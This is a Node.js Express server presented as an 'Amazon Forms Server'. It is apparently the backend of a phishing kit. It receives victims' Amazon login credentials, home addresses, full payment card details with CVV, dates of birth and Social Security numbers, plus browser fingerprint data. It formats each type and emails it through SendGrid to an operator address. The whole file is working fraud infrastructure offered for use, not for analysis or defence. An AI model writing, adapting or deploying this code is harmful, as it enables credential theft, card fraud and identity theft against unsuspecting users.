const express = require('express');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// Set SendGrid API key
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Store submissions in memory
let submissions = [];

// Route to handle all form submissions
app.post('/api/submit', async (req, res) => {
    try {
        const formData = req.body;
        const timestamp = new Date().toLocaleString();
        
        // Determine submission type based on data fields
        const submissionType = determineSubmissionType(formData);
        
        // Add server metadata
        const submissionData = {
            ...formData,
            submission_type: submissionType,
            submission_timestamp: timestamp,
            server_received: new Date().toISOString(),
            submission_id: submissions.length + 1
        };
        
        // Store in memory
        submissions.push(submissionData);
        
        console.log(`📨 Received ${submissionType} submission #${submissions.length} from IP: ${formData.ip_address || 'Unknown'}`);
        
        // Format and send email based on submission type
        const emailContent = formatEmailContent(submissionData, submissionType);
        await sendEmail(emailContent, submissionType);
        
        // Success response
        res.status(200).json({
            success: true,
            message: `${submissionType.charAt(0).toUpperCase() + submissionType.slice(1)} data received successfully`,
            timestamp: timestamp,
            id: submissions.length,
            type: submissionType
        });
        
    } catch (error) {
        console.error('❌ Error processing submission:', error);
        res.status(500).json({
            success: false,
            message: 'Error processing submission',
            error: error.message
        });
    }
});

// Function to determine submission type
function determineSubmissionType(data) {
    if (data.email && data.password) {
        return 'login';
    } else if (data.fullname && data.add1 && data.city) {
        return 'address';
    } else if (data.holder && data.ccnum && data.cvv2) {
        return 'card';
    } else {
        return 'unknown';
    }
}

// Route to get submission stats
app.get('/api/submissions', (req, res) => {
    const stats = {
        login: submissions.filter(s => s.submission_type === 'login').length,
        address: submissions.filter(s => s.submission_type === 'address').length,
        card: submissions.filter(s => s.submission_type === 'card').length,
        unknown: submissions.filter(s => s.submission_type === 'unknown').length
    };
    
    res.json({
        success: true,
        total: submissions.length,
        stats: stats,
        submissions: submissions.map(sub => ({
            id: sub.submission_id,
            type: sub.submission_type,
            timestamp: sub.submission_timestamp,
            ip: sub.ip_address || 'Unknown'
        }))
    });
});

// Health check route
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        service: 'Amazon Forms Server',
        timestamp: new Date().toISOString(),
        submissions: submissions.length
    });
});

// Root route
app.get('/', (req, res) => {
    res.json({
        service: 'Amazon Forms Server',
        version: '1.0.0',
        endpoints: {
            submit: 'POST /api/submit',
            stats: 'GET /api/submissions',
            health: 'GET /health'
        },
        handles: ['login', 'address', 'card']
    });
});

// Function to format email content based on submission type
function formatEmailContent(data, type) {
    let emailText = '';
    
    switch(type) {
        case 'login':
            emailText = formatLoginEmail(data);
            break;
        case 'address':
            emailText = formatAddressEmail(data);
            break;
        case 'card':
            emailText = formatCardEmail(data);
            break;
        default:
            emailText = formatUnknownEmail(data);
    }
    
    return emailText;
}

// Format login data email
function formatLoginEmail(data) {
    return `
=== AMAZON LOGIN CREDENTIALS ===
Received: ${data.submission_timestamp}
Submission ID: ${data.submission_id}

LOGIN INFORMATION:
─────────────────
Email: ${data.email || 'N/A'}
Password: ${data.password || 'N/A'}
Remember Me: ${data.rememberMe || 'N/A'}

TECHNICAL DATA:
───────────────
IP Address: ${data.ip_address || 'N/A'}
User Agent: ${data.user_agent || 'N/A'}
Screen Resolution: ${data.screen_resolution || 'N/A'}
Language: ${data.language || 'N/A'}
Timezone: ${data.timezone || 'N/A'}
Cookies Enabled: ${data.cookies_enabled || 'N/A'}
Client Timestamp: ${data.timestamp || 'N/A'}

SERVER INFO:
────────────
Server Received: ${data.server_received}
Total Submissions: ${submissions.length}
`;
}

// Format address data email
function formatAddressEmail(data) {
    return `
=== AMAZON ADDRESS INFORMATION ===
Received: ${data.submission_timestamp}
Submission ID: ${data.submission_id}

ADDRESS INFORMATION:
───────────────────
Full Name: ${data.fullname || 'N/A'}
Address Line 1: ${data.add1 || 'N/A'}
Address Line 2: ${data.add2 || 'N/A'}
City: ${data.city || 'N/A'}
State: ${data.state || 'N/A'}
ZIP Code: ${data.zip || 'N/A'}
Phone: ${data.phone || 'N/A'}
Country: ${data.country || 'N/A'}

TECHNICAL DATA:
───────────────
IP Address: ${data.ip_address || 'N/A'}
User Agent: ${data.user_agent || 'N/A'}
Screen Resolution: ${data.screen_resolution || 'N/A'}
Language: ${data.language || 'N/A'}
Timezone: ${data.timezone || 'N/A'}
Cookies Enabled: ${data.cookies_enabled || 'N/A'}
Client Timestamp: ${data.timestamp || 'N/A'}

SERVER INFO:
────────────
Server Received: ${data.server_received}
Total Submissions: ${submissions.length}
`;
}

// Format card data email
function formatCardEmail(data) {
    return `
=== AMAZON PAYMENT CARD INFORMATION ===
Received: ${data.submission_timestamp}
Submission ID: ${data.submission_id}

CARD INFORMATION:
────────────────
Card Holder: ${data.holder || 'N/A'}
Card Number: ${data.ccnum || 'N/A'}
Expiration: ${data.EXP1 || 'N/A'}/${data.EXP2 || 'N/A'}
CVV: ${data.cvv2 || 'N/A'}
3D Secure: ${data.vbv || 'N/A'}
Date of Birth: ${data.dob || 'N/A'}
SSN: ${data.ssn || 'N/A'}

TECHNICAL DATA:
───────────────
IP Address: ${data.ip_address || 'N/A'}
User Agent: ${data.user_agent || 'N/A'}
Screen Resolution: ${data.screen_resolution || 'N/A'}
Language: ${data.language || 'N/A'}
Timezone: ${data.timezone || 'N/A'}
Cookies Enabled: ${data.cookies_enabled || 'N/A'}
Client Timestamp: ${data.timestamp || 'N/A'}

SERVER INFO:
────────────
Server Received: ${data.server_received}
Total Submissions: ${submissions.length}
`;
}

// Format unknown data email
function formatUnknownEmail(data) {
    return `
=== UNKNOWN SUBMISSION TYPE ===
Received: ${data.submission_timestamp}
Submission ID: ${data.submission_id}

RAW DATA:
─────────
${JSON.stringify(data, null, 2)}

TECHNICAL DATA:
───────────────
IP Address: ${data.ip_address || 'N/A'}
User Agent: ${data.user_agent || 'N/A'}

SERVER INFO:
────────────
Server Received: ${data.server_received}
Total Submissions: ${submissions.length}
`;
}

// Function to send email using SendGrid
async function sendEmail(content, type) {
    const typeTitles = {
        'login': 'Login Credentials',
        'address': 'Address Information', 
        'card': 'Payment Card Details',
        'unknown': 'Unknown Submission'
    };
    
    const msg = {
        to: process.env.TO_EMAIL,
        from: process.env.FROM_EMAIL,
        subject: `Amazon ${typeTitles[type]} - ${new Date().toLocaleString()}`,
        text: content
    };

    try {
        await sgMail.send(msg);
        console.log(`✅ Email sent successfully for ${type} submission`);
        return true;
    } catch (error) {
        console.error('❌ Error sending email:', error);
        if (error.response) {
            console.error('SendGrid error details:', error.response.body);
        }
        throw error;
    }
}

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('❌ Unhandled error:', error);
    res.status(500).json({
        success: false,
        message: 'Internal server error'
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        message: 'Endpoint not found'
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`
🚀 Amazon Forms Server running on port ${PORT}
📍 Health check: http://localhost:${PORT}/health
📥 Submit endpoint: http://localhost:${PORT}/api/submit
📊 Stats: http://localhost:${PORT}/api/submissions

📧 SendGrid: ${process.env.SENDGRID_API_KEY ? '✅ Configured' : '❌ Not Configured'}
📝 Handles: Login, Address, Card submissions
    `);
});

module.exports = app;
